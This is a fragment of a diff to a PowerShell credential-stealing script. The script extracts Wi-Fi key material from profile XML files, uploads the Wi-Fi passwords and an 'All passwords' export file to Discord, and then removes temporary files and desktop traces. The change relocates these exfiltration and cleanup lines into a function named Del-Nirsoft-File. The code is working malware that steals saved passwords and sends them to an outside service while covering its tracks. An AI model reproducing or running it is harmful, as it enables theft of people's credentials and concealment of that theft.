@@ -40,14 +40,13 @@ Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMateri
 Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
-
-Upload-Discord -file "$desktop\export.txt" -text "All passwords:"
-Set-Location -Path "$env:temp"
-Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
 }
 
  function Del-Nirsoft-File {
   cd C:\
+  Upload-Discord -file "$desktop\export.txt" -text "All passwords:"
+  Set-Location -Path "$env:temp"
+  Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
   rmdir -R \temp
 }
 
